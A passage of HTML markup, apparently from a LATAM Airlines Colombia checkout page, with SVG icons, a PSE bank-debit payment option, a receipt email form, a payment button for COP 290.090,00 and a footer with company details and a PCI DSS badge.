              d="M5.27246 9.98433C6.32345 8.139 7.79972 6.63631 9.69638 5.47625C11.593 4.31619 13.6852 3.73371 15.9779 3.73371C17.7963 3.73371 19.5561 4.14487 21.2523 4.9623C22.7775 5.69651 24.0827 6.67547 25.1728 7.89916L22.9828 7.14047C22.7188 7.04747 22.4304 7.18942 22.3424 7.45373C22.2496 7.71805 22.3913 8.00684 22.6553 8.09495L25.598 9.11306C25.7007 9.14732 25.8034 9.16201 25.9011 9.16201C26.2873 9.16201 26.649 8.91727 26.781 8.53548L27.7978 5.58883C27.8907 5.32451 27.7489 5.03572 27.4849 4.94762C27.221 4.85462 26.9326 4.99656 26.8446 5.26088L26.1162 7.36563C24.9381 5.97552 23.5107 4.85951 21.8292 4.0274C19.9863 3.12187 18.0358 2.66666 15.9827 2.66666C14.2718 2.66666 12.6294 2.98482 11.0651 3.61624C9.49596 4.24767 8.08324 5.15809 6.81717 6.34752C5.55109 7.53205 4.5441 8.96622 3.7913 10.6402C3.04339 12.3142 2.66699 14.1008 2.66699 16C2.66699 16.3965 2.68166 16.7734 2.7061 17.1258C2.73054 17.4831 2.76965 17.8062 2.82342 18.0949C2.84786 18.2516 2.90652 18.374 2.9994 18.4523C3.09228 18.5306 3.20471 18.5697 3.33669 18.5697H3.3758V18.5306H3.4149C3.54689 18.5061 3.65932 18.4327 3.7522 18.3152C3.84507 18.1977 3.87929 18.0705 3.84996 17.9383C3.79619 17.5174 3.75709 17.1405 3.73264 16.8125C3.7082 16.4846 3.69354 16.2105 3.69354 16C3.69354 14.9476 3.82552 13.9099 4.08949 12.8918C4.35346 11.8786 4.74941 10.9094 5.27246 9.98433Z"
              fill="currentColor"
            ></path>
            <path
              d="M29.2985 14.9329C29.2741 14.5903 29.2301 14.2721 29.1812 13.9833C29.1567 13.8512 29.0834 13.7386 28.9661 13.6456C28.8488 13.5526 28.7217 13.5183 28.5897 13.5477C28.4577 13.5722 28.3453 13.6456 28.2524 13.7631C28.1595 13.8806 28.1253 14.0078 28.1546 14.14C28.2084 14.4581 28.2377 14.7665 28.2524 15.07C28.2671 15.3735 28.272 15.6818 28.272 16C28.272 17.581 27.9836 19.0984 27.4018 20.5521C26.8201 22.001 25.994 23.3079 24.9137 24.4679C23.8089 25.628 22.4744 26.558 20.9248 27.2579C19.3703 27.9579 17.723 28.3054 15.9876 28.3054C14.1154 28.3054 12.341 27.8992 10.6545 27.0768C9.12934 26.3377 7.82416 25.349 6.72918 24.1155H8.99736C9.27599 24.1155 9.50085 23.8903 9.50085 23.6113C9.50085 23.3323 9.27599 23.1072 8.99736 23.1072H5.88351C5.37023 23.1072 4.94984 23.5232 4.94984 24.0421V27.1552C4.94984 27.4342 5.1747 27.6593 5.45333 27.6593C5.73197 27.6593 5.95683 27.4342 5.95683 27.1552V24.791C7.15447 26.1273 8.55741 27.1943 10.1706 27.9873C11.989 28.883 13.9248 29.3333 15.9779 29.3333C17.1364 29.3333 18.2607 29.1963 19.3557 28.9173C20.4507 28.6383 21.4968 28.2124 22.4989 27.6299C24.5275 26.4944 26.1749 24.8987 27.4361 22.8429C28.7021 20.7871 29.3327 18.5061 29.3327 16C29.3376 15.6329 29.3229 15.2756 29.2985 14.9329Z"
              fill="currentColor"
            ></path>
            <path
              d="M5.27246 9.98433C6.32345 8.139 7.79972 6.63631 9.69638 5.47625C11.593 4.31619 13.6852 3.73371 15.9779 3.73371C17.7963 3.73371 19.5561 4.14487 21.2523 4.9623C22.7775 5.69651 24.0827 6.67547 25.1728 7.89916L22.9828 7.14047C22.7188 7.04747 22.4304 7.18942 22.3424 7.45373C22.2496 7.71805 22.3913 8.00684 22.6553 8.09495L25.598 9.11306C25.7007 9.14732 25.8034 9.16201 25.9011 9.16201C26.2873 9.16201 26.649 8.91727 26.781 8.53548L27.7978 5.58883C27.8907 5.32451 27.7489 5.03572 27.4849 4.94762C27.221 4.85462 26.9326 4.99656 26.8446 5.26088L26.1162 7.36563C24.9381 5.97552 23.5107 4.85951 21.8292 4.0274C19.9863 3.12187 18.0358 2.66666 15.9827 2.66666C14.2718 2.66666 12.6294 2.98482 11.0651 3.61624C9.49596 4.24767 8.08324 5.15809 6.81717 6.34752C5.55109 7.53205 4.5441 8.96622 3.7913 10.6402C3.04339 12.3142 2.66699 14.1008 2.66699 16C2.66699 16.3965 2.68166 16.7734 2.7061 17.1258C2.73054 17.4831 2.76965 17.8062 2.82342 18.0949C2.84786 18.2516 2.90652 18.374 2.9994 18.4523C3.09228 18.5306 3.20471 18.5697 3.33669 18.5697H3.3758V18.5306H3.4149C3.54689 18.5061 3.65932 18.4327 3.7522 18.3152C3.84507 18.1977 3.87929 18.0705 3.84996 17.9383C3.79619 17.5174 3.75709 17.1405 3.73264 16.8125C3.7082 16.4846 3.69354 16.2105 3.69354 16C3.69354 14.9476 3.82552 13.9099 4.08949 12.8918C4.35346 11.8786 4.74941 10.9094 5.27246 9.98433Z"
              stroke="currentColor"
              stroke-width="0.166667"
            ></path>
            <path
              d="M29.2985 14.9329C29.2741 14.5903 29.2301 14.2721 29.1812 13.9833C29.1567 13.8512 29.0834 13.7386 28.9661 13.6456C28.8488 13.5526 28.7217 13.5183 28.5897 13.5477C28.4577 13.5722 28.3453 13.6456 28.2524 13.7631C28.1595 13.8806 28.1253 14.0078 28.1546 14.14C28.2084 14.4581 28.2377 14.7665 28.2524 15.07C28.2671 15.3735 28.272 15.6818 28.272 16C28.272 17.581 27.9836 19.0984 27.4018 20.5521C26.8201 22.001 25.994 23.3079 24.9137 24.4679C23.8089 25.628 22.4744 26.558 20.9248 27.2579C19.3703 27.9579 17.723 28.3054 15.9876 28.3054C14.1154 28.3054 12.341 27.8992 10.6545 27.0768C9.12934 26.3377 7.82416 25.349 6.72918 24.1155H8.99736C9.27599 24.1155 9.50085 23.8903 9.50085 23.6113C9.50085 23.3323 9.27599 23.1072 8.99736 23.1072H5.88351C5.37023 23.1072 4.94984 23.5232 4.94984 24.0421V27.1552C4.94984 27.4342 5.1747 27.6593 5.45333 27.6593C5.73197 27.6593 5.95683 27.4342 5.95683 27.1552V24.791C7.15447 26.1273 8.55741 27.1943 10.1706 27.9873C11.989 28.883 13.9248 29.3333 15.9779 29.3333C17.1364 29.3333 18.2607 29.1963 19.3557 28.9173C20.4507 28.6383 21.4968 28.2124 22.4989 27.6299C24.5275 26.4944 26.1749 24.8987 27.4361 22.8429C28.7021 20.7871 29.3327 18.5061 29.3327 16C29.3376 15.6329 29.3229 15.2756 29.2985 14.9329Z"
              stroke="currentColor"
              stroke-width="0.166667"
            ></path>
            <path
              d="M16.4421 18.6662C16.5615 18.6686 16.6599 18.5678 16.6622 18.4425C16.6622 18.44 16.6622 18.4375 16.6622 18.4351V17.791C16.6716 17.7885 16.681 17.7861 16.6903 17.7836C16.9479 17.7369 17.1891 17.6435 17.3858 17.4862C17.5825 17.3288 17.7394 17.1026 17.7698 16.8273C17.8307 16.2791 17.5778 15.8833 17.2851 15.6645C16.9901 15.4481 16.6599 15.367 16.489 15.3326C16.3391 15.3031 16.0651 15.2343 15.8614 15.0843C15.6577 14.9343 15.5148 14.7377 15.557 14.3394C15.571 14.2017 15.6389 14.0936 15.7654 13.9928C15.8918 13.892 16.0768 13.8109 16.2782 13.774C16.6833 13.7002 17.1446 13.8084 17.3788 14.0567C17.4631 14.1477 17.5989 14.1477 17.6855 14.0592C17.7722 13.9707 17.7722 13.8256 17.6879 13.7371C17.4209 13.4519 17.0439 13.3241 16.6622 13.3044V12.68C16.6669 12.5546 16.5733 12.4489 16.4538 12.444C16.4421 12.444 16.4304 12.444 16.4187 12.4465C16.3087 12.4612 16.2244 12.562 16.229 12.68V13.3241C16.2197 13.3266 16.2103 13.3216 16.2009 13.3241C15.9434 13.3708 15.7022 13.4716 15.5055 13.6289C15.3088 13.7863 15.1519 14.0125 15.1214 14.2878C15.0605 14.836 15.3134 15.2318 15.6062 15.4506C15.9012 15.6669 16.2314 15.7407 16.4023 15.7776C16.5522 15.8071 16.8262 15.8808 17.0299 16.0332C17.2336 16.1832 17.3764 16.3725 17.3343 16.7708C17.3202 16.9084 17.2523 17.024 17.1259 17.1248C16.9994 17.2256 16.8144 17.3018 16.6131 17.3362C16.208 17.4099 15.7467 17.3091 15.5125 17.0609C15.4282 16.9723 15.29 16.9699 15.2057 17.0584C15.1214 17.1469 15.1191 17.2895 15.2034 17.378C15.4703 17.6632 15.8473 17.7935 16.229 17.8107V18.4351C16.229 18.5605 16.3227 18.6637 16.4421 18.6662Z"
              fill="currentColor"
              stroke="currentColor"
              stroke-width="0.333333"
            ></path>
            <path
              fill-rule="evenodd"
              clip-rule="evenodd"
              d="M16.445 20.9782C19.4396 20.9782 21.8672 18.5506 21.8672 15.556C21.8672 12.5614 19.4396 10.1338 16.445 10.1338C13.4504 10.1338 11.0228 12.5614 11.0228 15.556C11.0228 18.5506 13.4504 20.9782 16.445 20.9782ZM16.445 22.2226C20.1269 22.2226 23.1117 19.2379 23.1117 15.556C23.1117 11.8741 20.1269 8.88931 16.445 8.88931C12.7631 8.88931 9.77832 11.8741 9.77832 15.556C9.77832 19.2379 12.7631 22.2226 16.445 22.2226Z"
              fill="currentColor"
            ></path>
          </svg>
          <div style="width: 75%">
            <p class="fw-bold tc-ocean m-0">
              Débito bancario PSE vía SafetyPay
            </p>
            <p class="mt-1 tc-gray-smoke">
              Te derivaremos a PSE vía SafetyPay para continuar con tu pago.
            </p>
          </div>
          <div>
            <div class="radio-container m-2">
              <input type="radio" name="travel-opt" disabled />
              <div class="radio-blue ct-radio"></div>
            </div>
          </div>
        </div>
      </div>

      <p class="tc-ocean fw-lighter fs-1 pt-3 m-0 mb-4">
        ¿A dónde enviamos el comprobante de compra?
      </p>

      <form class="rounded-borded pl-3 pr-3 bg-white mb-5" id="form-email">
        <p class="tc-ocean mt-4">
          La persona que reciba el comprobante será
          <span class="fw-bold">administradora del viaje</span> y la única que
          podrá solicitar cambios y devoluciones.
        </p>
        <div class="input-container mb-4">
          <input required type="email" id="email" required />
          <label for="origin">Email</label>
        </div>
        <button id="btn-email" type="submit" class="d-none"></button>
      </form>

      <p class="fw-bold fs-4">
        Puedes consultar los
        <a href="" class="tc-blue">términos y condiciones de la compra aquí</a>
      </p>

      <button type="button" class="btn-success mb-5" id="btn-pagar">
        Pagar <span id="btn-pagar-monto">COP 290.090,00</span>
      </button>
    </main>

    <footer>
      <svg height="2rem" width="auto" viewBox="0 0 235 73">
        <g fill="none" fill-rule="evenodd">
          <path
            d="M228.193 54.161c-4.395 0-7.267 1.82-7.267 4.63 0 2.646 2.196 3.639 5.745 4.3l1.69.33c2.535.496 3.886 1.323 3.886 2.646 0 1.322-1.35 2.316-4.731 2.316-3.041 0-5.408-.994-6.084-1.49l-.677 2.316c.677.33 3.043 1.323 6.591 1.323 4.734 0 7.438-1.82 7.438-4.63 0-2.645-2.367-3.968-6.085-4.63l-1.69-.331c-2.704-.496-3.549-.992-3.549-2.315 0-1.322 1.522-2.314 4.562-2.314 2.536 0 4.395.495 5.24.826l.509-1.984c-1.015-.33-2.875-.993-5.578-.993zM75.596 70.366h2.533l-7.604-15.212c-.337-.497-.676-.662-1.182-.662h-1.859l-7.942 15.874h2.534l2.029-4.133h9.462l2.03 4.133zm31.261 0v-5.787c1.184.66 2.874.992 4.734.992 1.013 0 1.69 0 2.533-.165l3.38 4.96h2.704l-3.718-5.622c2.368-.992 3.887-2.976 3.887-5.291 0-2.976-2.534-5.126-7.097-5.126h-8.956v16.039h2.533zm62.866 0V57.304l11.152 12.4c.338.497.845.662 1.52.662h1.523V54.492h-2.367V67.06l-10.985-11.905c-.337-.497-.673-.662-1.519-.662h-1.691v15.874h2.367zm-97.17-6.283h-7.434l3.717-7.44 3.717 7.44zm39.206-.662c-1.86 0-3.718-.495-4.902-1.157v-5.952h6.592c3.212 0 4.394 1.653 4.394 3.14 0 2.15-1.692 3.97-6.084 3.97zm19.433 6.945h11.83v-2.15h-9.295V54.492h-2.535v15.874zm-41.91 0h2.537V54.492h-2.536v15.874zm107.309-15.874v15.874h13.013V68.05h-10.477v-4.96h9.123v-2.15h-9.123v-4.299h10.138v-2.15h-12.674zm-44.275 15.874h2.537V54.492h-2.537v15.874zM114.97 37.164h7.874L110.58 13.522c-.643-1.164-1.279-1.608-2.747-1.608h-6.77l-12.905 25.25h7.866l2.29-4.655h14.46l2.195 4.655zm64.528 0h7.778l-12.268-23.642c-.636-1.164-1.276-1.608-2.739-1.608h-6.773l-12.906 25.25h7.871l2.287-4.655h14.462l2.288 4.655zm27.728-6.177c.279.895 1.375 1.522 2.565 1.522h7.414l5.491-14.86 5.215 19.515h6.955l-5.764-22.383c-.543-2.239-1.829-2.867-3.933-2.867h-7.232l-5.214 14.777-4.122-12.543c-.545-1.606-1.557-2.234-3.203-2.234h-8.143l-6.684 25.25h7.052l5.118-19.515 4.485 13.338zm-32.574-3.584h-9.615l4.856-10.117 4.759 10.117zm-64.44 0h-9.608l4.854-10.117 4.755 10.117zm-27.545 9.761l2.927-5.822h-17.3V11.914h-7.412v25.25h21.785zm51.437 0h7.133v-19.43l12.453-.806v-5.014h-32.036v5.014l12.45.805v19.431zM10.655 62.807l6.316-2.249c1.316-.468 1.316.568 1.316 2.113v2.844c0 2.3-.79 2.58-1.842 2.955l-5.79 2.062v-7.725m0-12.616l16.053-5.717c1.315-.468 1.315.567 1.315 2.112v2.832c0 2.312-.79 2.593-1.842 2.968l-15.526 5.53V50.19M9.34 32.214l-8.158-2.905C.13 28.934.13 27.533.13 27.019c0 0 0 1.688 1.578 1.126L41.707 13.9c3.158-1.125 3.158-1.992 1.842-2.46 1.316.468 1.316.468 1.316 4.25 0 3.604 0 4.81-1.579 5.372L11.971 32.214c-1.316.469-1.316.469-2.631 0"
            fill="#1B0088"
          ></path>
          <path
            d="M3.55 17.536l13.974 4.976 10.845-3.862L2.235 9.343C.393 8.687.13 8.593.13 9.881v3.347c0 3.09 2.368 3.933 3.42 4.308m40 6.52l-4.336-1.544-10.845 3.862 6.868 2.446 6.47-2.304c3.158-1.124 3.158-1.991 1.842-2.46"
            fill="#ED1650"
          ></path>
          <path
            d="M43.55 24.056c1.315.469 1.315 1.336-1.843 2.46L10.655 37.575v7.724l32.631-11.62c1.579-.563 1.579-1.769 1.579-5.374 0-3.78 0-3.78-1.316-4.249"
            fill="#1B0088"
          ></path>
          <path
            d="M43.55 11.44L12.76.475c-1.841-.656-2.105-.75-2.105.538V4.36c0 3.09 2.368 3.933 3.42 4.308l21.162 7.536 6.47-2.304c3.158-1.125 3.158-1.992 1.842-2.46M1.708 28.145l8.948-3.187-8.421-2.999C.393 21.303.13 21.21.13 22.497v4.521s0 1.689 1.578 1.127"
            fill="#ED1650"
          ></path>
        </g>
      </svg>
      <p class="fs-5 pr-5 pl-5">
        © 2024 LATAM Airlines Colombia. NIT: 890.704.196-6, Aerovias de
        Integración Regional S.A - Aires S.A. Av. El Dorado No.103-08 Entrada 1
        - Hangar. customer_service@sac.latam.com. 601 - 5185800
      </p>
      <p class="fs-5 pr-5 pl-5">Certificado por:</p>
      <svg
        width="40px"
        height="40px"
        viewBox="0 0 40 40"
        fill="none"
        xmlns="http://www.w3.org/2000/svg"
      >
        <g clip-path="url(#id-PCIDSSCompliantGreyscale)">
          <path
            d="M32.071 40H7.92896C3.56636 40 0 36.4264 0 32.0602V7.93984C0 3.57126 3.56636 0 7.92896 0H32.0734C36.4336 0 40.0024 3.57126 40.0024 7.93984V32.0602C40 36.4264 36.4313 40 32.071 40Z"
            fill="#858585"
          ></path>
          <path
            d="M28.0231 8.86369C27.4367 9.71593 26.8788 10.7233 26.8788 10.7233L28.5881 10.1981C28.5881 10.1981 28.1376 9.1048 28.0231 8.86369Z"
            fill="white"
          ></path>
          <path
            d="M34.2333 20.7424H6.71555V20.8427H34.2333V20.7424Z"
            fill="white"
          ></path>
          <path
            d="M11.7552 25.5622C11.7027 25.641 11.6264 25.6816 11.5263 25.6816C11.4214 25.6816 11.3404 25.6314 11.2832 25.5335C11.2259 25.4357 11.1973 25.2542 11.1973 24.9893C11.1973 24.7744 11.2212 24.6192 11.2689 24.519C11.3332 24.3853 11.4238 24.3161 11.543 24.3161C11.5955 24.3161 11.6431 24.3304 11.686 24.3614C11.729 24.3925 11.7647 24.4354 11.7933 24.4927C11.81 24.5261 11.8291 24.5787 11.8458 24.6527L12.313 24.507C12.2534 24.254 12.1604 24.0678 12.0389 23.9461C11.9149 23.8243 11.7456 23.7622 11.5311 23.7622C11.2569 23.7622 11.0424 23.8697 10.8922 24.0821C10.742 24.2946 10.6657 24.5978 10.6657 24.994C10.6657 25.29 10.7086 25.5335 10.7945 25.7245C10.8803 25.9155 10.9804 26.0468 11.0996 26.1232C11.2164 26.1996 11.369 26.2354 11.5549 26.2354C11.7075 26.2354 11.8339 26.2043 11.934 26.1423C12.0341 26.0802 12.1152 25.9895 12.1819 25.8654C12.2487 25.7436 12.2987 25.5908 12.3297 25.4094L11.8672 25.2137C11.8458 25.3664 11.8076 25.481 11.7552 25.5622Z"
            fill="white"
          ></path>
          <path
            d="M14.0008 24.3137V23.8028H12.5872V26.1948H14.0271V25.6529H13.1164V25.1802H13.9389V24.6933H13.1164V24.3137H14.0008Z"
            fill="white"
          ></path>
          <path
            d="M16.001 26.1948L15.7459 25.5025C15.734 25.4667 15.7077 25.419 15.672 25.3545C15.6362 25.29 15.6076 25.2495 15.5885 25.228C15.5599 25.1993 15.5146 25.1683 15.4503 25.1397C15.5289 25.1158 15.5909 25.0824 15.6362 25.0442C15.7077 24.9845 15.7626 24.9057 15.8031 24.8102C15.8436 24.7147 15.8627 24.6002 15.8627 24.4665C15.8627 24.3137 15.8365 24.1848 15.784 24.0797C15.7316 23.9747 15.6624 23.9007 15.5742 23.8625C15.4884 23.8243 15.3621 23.8028 15.2 23.8028H14.3203V26.1948H14.8519V25.2232H14.8996C14.9473 25.2232 14.9902 25.2423 15.0283 25.2781C15.0569 25.3068 15.0879 25.3688 15.1237 25.4619L15.405 26.1924H16.001V26.1948ZM15.2977 24.6646C15.2762 24.7052 15.2476 24.7291 15.2119 24.7386C15.1427 24.7601 15.0951 24.772 15.0712 24.772H14.8495V24.285H15.0808C15.1761 24.285 15.2429 24.3065 15.2786 24.3471C15.3144 24.3877 15.3311 24.4474 15.3311 24.5261C15.3311 24.5763 15.3191 24.624 15.2977 24.6646Z"
            fill="white"
          ></path>
          <path
            d="M17.0952 26.1948V24.3925H17.634V23.8028H16.0272V24.3925H16.566V26.1948H17.0952Z"
            fill="white"
          ></path>
          <path
            d="M18.423 23.8028H17.8938V26.1948H18.423V23.8028Z"
            fill="white"
          ></path>
          <path
            d="M20.1108 24.3161V23.8028H18.8044V26.1948H19.3337V25.216H19.9964V24.7338H19.3337V24.3161H20.1108Z"
            fill="white"
          ></path>
          <path
            d="M20.9452 23.8028H20.416V26.1948H20.9452V23.8028Z"
            fill="white"
          ></path>
          <path
            d="M22.738 24.3137V23.8028H21.3219V26.1948H22.7642V25.6529H21.8511V25.1802H22.6736V24.6933H21.8511V24.3137H22.738Z"
            fill="white"
          ></path>
          <path
            d="M24.3924 25.9394C24.4663 25.8439 24.5235 25.7269 24.5664 25.5861C24.607 25.4452 24.6284 25.2471 24.6284 24.9917C24.6284 24.8293 24.6141 24.6742 24.5855 24.5285C24.5569 24.3829 24.5116 24.254 24.4496 24.1442C24.3876 24.0344 24.309 23.9508 24.2136 23.8912C24.1183 23.8315 23.9943 23.8028 23.8393 23.8028H23.055V26.1948H23.8393C23.9323 26.1948 24.0372 26.1733 24.154 26.1303C24.2398 26.0969 24.3185 26.0349 24.3924 25.9394ZM24.0587 25.419C24.0324 25.5049 23.9967 25.5646 23.949 25.598C23.9013 25.6314 23.825 25.6505 23.713 25.6505H23.5843V24.3423H23.7154C23.8513 24.3423 23.949 24.3901 24.0086 24.4832C24.0682 24.5763 24.0968 24.7505 24.0968 25.0036C24.0968 25.1969 24.0849 25.3354 24.0587 25.419Z"
            fill="white"
          ></path>
          <path
            d="M27.1077 24.7625C27.1697 24.6622 27.2031 24.5405 27.2031 24.3996C27.2031 24.2301 27.1578 24.0893 27.0696 23.9747C26.9813 23.8601 26.855 23.8028 26.6905 23.8028H25.7012V26.1948H26.6118C26.65 26.1948 26.7286 26.1829 26.8478 26.1614C26.936 26.1447 27.0052 26.1184 27.0481 26.0826C27.1196 26.0253 27.1768 25.9465 27.2174 25.8487C27.2579 25.7508 27.2793 25.6386 27.2793 25.5144C27.2793 25.3617 27.2507 25.2351 27.1935 25.1349C27.1363 25.0346 27.0457 24.963 26.9217 24.9224C27.0052 24.8818 27.0672 24.8293 27.1077 24.7625ZM26.2352 24.2874H26.4688C26.5499 24.2874 26.6047 24.3065 26.6381 24.3471C26.6714 24.3853 26.6857 24.4402 26.6857 24.5094C26.6857 24.5834 26.6691 24.6407 26.6381 24.6813C26.6047 24.7219 26.5475 24.741 26.4664 24.741H26.2376V24.2874H26.2352ZM26.6977 25.6123C26.6595 25.6577 26.5951 25.6792 26.5046 25.6792H26.2352V25.1946H26.5022C26.5951 25.1946 26.6595 25.216 26.6953 25.259C26.731 25.302 26.7501 25.3593 26.7501 25.4285C26.7525 25.5073 26.7334 25.567 26.6977 25.6123Z"
            fill="white"
          ></path>
          <path
            d="M28.3164 24.6097L27.9731 23.8028H27.3866L28.0517 25.1922V26.1948H28.581V25.1922L29.2461 23.8028H28.662L28.3164 24.6097Z"
            fill="white"
          ></path>
          <path
            d="M13.8673 36.7749H14.3394C14.3394 36.7749 14.2202 36.9802 14.0557 37.0375C13.9794 37.0638 13.9079 37.0829 13.8197 37.0829C13.6361 37.0829 13.4931 37.0351 13.3905 36.9396C13.288 36.8441 13.238 36.7081 13.238 36.4861C13.238 36.276 13.288 36.1232 13.3905 36.0253C13.4931 35.9274 13.6289 35.8797 13.7982 35.8797C13.9126 35.8797 14.008 35.9012 14.0819 35.9418C14.1558 35.9823 14.2082 36.042 14.2392 36.1208L14.9902 36.011C14.9449 35.8773 14.8757 35.7675 14.7852 35.6816C14.6946 35.5956 14.5801 35.5312 14.4419 35.4906C14.3036 35.45 14.0962 35.4285 13.8173 35.4285C13.5288 35.4285 13.3 35.4619 13.1283 35.5288C12.909 35.6147 12.7445 35.7412 12.6301 35.9083C12.5156 36.0754 12.4608 36.2688 12.4608 36.4956C12.4608 36.7081 12.5133 36.899 12.6158 37.0638C12.7183 37.2285 12.8661 37.3287 13.0544 37.4123C13.2427 37.4958 13.4859 37.5364 13.7863 37.5364C14.0294 37.5364 14.3179 37.3526 14.4156 37.2619V37.4648L15.0259 37.4624V36.3046H13.8721V36.7749H13.8673Z"
            fill="white"
          ></path>
          <path
            d="M16.5421 36.7152L16.051 35.5097H15.1237V37.4576H15.8078V36.2497L16.2513 37.4576H16.8282L17.2239 36.2497V37.4576H17.9558V35.5097H17.0046L16.5421 36.7152Z"
            fill="white"
          ></path>
          <path
            d="M19.7843 36.8847C19.7271 36.8346 19.6532 36.7964 19.5673 36.7653C19.4791 36.7367 19.3862 36.7128 19.2836 36.6985C19.1811 36.6818 19.0882 36.6651 19 36.6436C18.9118 36.6221 18.8402 36.5959 18.783 36.5624C18.7258 36.529 18.6972 36.4813 18.6972 36.4192C18.6972 36.3476 18.733 36.2903 18.8045 36.2473C18.876 36.2044 18.9785 36.1829 19.112 36.1829C19.2455 36.1829 19.3575 36.2044 19.4458 36.2473C19.534 36.2903 19.5888 36.3667 19.6079 36.4717L19.8081 36.4025C19.7724 36.2831 19.7032 36.1948 19.5983 36.1375C19.4744 36.0707 19.3146 36.0372 19.1144 36.0372C18.9094 36.0372 18.7496 36.0731 18.6376 36.1471C18.5256 36.2211 18.4707 36.3165 18.4707 36.4311C18.4707 36.5218 18.4993 36.5911 18.5565 36.6412C18.6138 36.6913 18.6877 36.7295 18.7735 36.7558C18.8617 36.7821 18.9547 36.8035 19.0572 36.8155C19.1597 36.8298 19.2527 36.8441 19.3409 36.8632C19.4291 36.8823 19.5006 36.9086 19.5578 36.9396C19.615 36.973 19.6436 37.0232 19.6436 37.09C19.6436 37.1234 19.6341 37.1568 19.615 37.1855C19.5959 37.2165 19.5673 37.2428 19.5316 37.2667C19.4958 37.2905 19.4481 37.3096 19.3909 37.3239C19.3337 37.3383 19.267 37.3454 19.1883 37.3454C19.0286 37.3454 18.9046 37.3216 18.8188 37.2714C18.733 37.2237 18.6734 37.1377 18.64 37.0184L18.4373 37.1019C18.4469 37.1377 18.4612 37.1712 18.4803 37.2022C18.5136 37.2595 18.5589 37.3096 18.6185 37.3526C18.6781 37.3956 18.7496 37.429 18.8331 37.4529C18.9165 37.4767 19.0119 37.4887 19.1215 37.4887C19.2288 37.4887 19.3289 37.4791 19.4195 37.4624C19.5101 37.4457 19.5888 37.4194 19.6555 37.386C19.7223 37.3526 19.7724 37.3096 19.8105 37.2595C19.8486 37.2094 19.8677 37.1497 19.8677 37.0852C19.8725 37.0041 19.8415 36.9324 19.7843 36.8847Z"
            fill="white"
          ></path>
          <path
            d="M21.3815 36.2354C21.2385 36.1041 21.0406 36.0396 20.7879 36.0396C20.6568 36.0396 20.5376 36.0587 20.4351 36.0969C20.3302 36.1351 20.2444 36.1876 20.1705 36.2545C20.099 36.3213 20.0441 36.4001 20.0036 36.4884C19.9655 36.5768 19.9464 36.6722 19.9464 36.7749C19.9464 36.8752 19.9631 36.9706 19.9964 37.059C20.0298 37.1473 20.0799 37.2237 20.149 37.2881C20.2181 37.3526 20.304 37.4051 20.4112 37.4409C20.5185 37.4791 20.6425 37.4958 20.7903 37.4958C20.9047 37.4958 21.0072 37.4839 21.0954 37.46C21.1836 37.4361 21.2575 37.4051 21.3219 37.3621C21.3863 37.3216 21.4387 37.2714 21.4816 37.2165C21.5126 37.1759 21.5365 37.1354 21.5579 37.09L21.3457 37.0327C21.3124 37.133 21.2456 37.2117 21.1479 37.2667C21.0478 37.3216 20.9286 37.3502 20.7903 37.3502C20.6878 37.3502 20.5996 37.3359 20.5209 37.3072C20.4422 37.2786 20.3779 37.238 20.3278 37.1903C20.2777 37.1425 20.2396 37.0828 20.2134 37.016C20.1872 36.9492 20.1752 36.8775 20.1752 36.8035H21.5984C21.5961 36.5553 21.5269 36.3643 21.3815 36.2354ZM20.1729 36.6699C20.1824 36.603 20.2015 36.5409 20.2325 36.4837C20.2634 36.424 20.304 36.3738 20.354 36.3285C20.4041 36.2831 20.4661 36.2473 20.5376 36.2211C20.6091 36.1948 20.6925 36.1805 20.7879 36.1805C20.8833 36.1805 20.9667 36.1924 21.0382 36.2187C21.1121 36.2449 21.1717 36.2783 21.2194 36.3237C21.2671 36.3667 21.3052 36.4192 21.3291 36.4789C21.3529 36.5386 21.3672 36.603 21.3672 36.6699H20.1729Z"
            fill="white"
          ></path>
          <path
            d="M22.8953 37.2523C22.7999 37.3192 22.6736 37.3502 22.5139 37.3502C22.4018 37.3502 22.3088 37.3335 22.2302 37.3001C22.1515 37.2667 22.0895 37.2237 22.0395 37.1688C21.9894 37.1139 21.9536 37.0518 21.9322 36.9826C21.9107 36.9134 21.8988 36.8417 21.8988 36.7701C21.8988 36.6985 21.9107 36.6293 21.9346 36.5577C21.9584 36.4884 21.9942 36.424 22.0442 36.3691C22.0943 36.3142 22.1563 36.2688 22.2349 36.2354C22.3136 36.202 22.4066 36.1853 22.5139 36.1853C22.6545 36.1853 22.7713 36.2139 22.8643 36.2712C22.9573 36.3285 23.0216 36.4096 23.0598 36.5123L23.2577 36.4407C23.2171 36.3142 23.1408 36.2187 23.0312 36.1542C22.9001 36.0778 22.7284 36.0396 22.5162 36.0396C22.3804 36.0396 22.2588 36.0587 22.1539 36.0993C22.049 36.1399 21.9608 36.1924 21.8893 36.2616C21.8178 36.3285 21.7653 36.4073 21.7272 36.4956C21.6914 36.5839 21.6723 36.6746 21.6723 36.7725C21.6723 36.8728 21.689 36.9683 21.7224 37.059C21.7558 37.1473 21.8058 37.2237 21.875 37.2905C21.9441 37.355 22.0299 37.4075 22.1372 37.4433C22.2445 37.4815 22.3684 37.4982 22.5162 37.4982C22.6307 37.4982 22.7356 37.4863 22.8238 37.46C22.9144 37.4362 22.9906 37.4003 23.055 37.355C23.1194 37.3096 23.1718 37.2547 23.2147 37.1927C23.2457 37.1449 23.2696 37.0924 23.2886 37.0375L23.0789 36.9826C23.0502 37.0948 22.9907 37.1855 22.8953 37.2523Z"
            fill="white"
          ></path>
          <path
            d="M23.9514 37.3502C23.9061 37.3502 23.8727 37.3478 23.8465 37.3407C23.8226 37.3335 23.8036 37.3216 23.7916 37.3048C23.7797 37.2881 23.7726 37.269 23.7702 37.2428C23.7678 37.2189 23.7678 37.1879 23.7678 37.1545V36.2306H24.1349V36.0731H23.7678V35.5455L23.5556 35.6171V36.0731H23.2982V36.2306H23.5556V37.2165C23.5556 37.3192 23.5842 37.3908 23.6391 37.4314C23.6939 37.472 23.7749 37.4911 23.8822 37.4911C23.9347 37.4911 23.9823 37.4863 24.0229 37.4767C24.0658 37.4672 24.0992 37.4624 24.1254 37.4576V37.3263C24.0968 37.3311 24.0682 37.3359 24.0396 37.3407C24.0086 37.3478 23.98 37.3502 23.9514 37.3502Z"
            fill="white"
          ></path>
          <path
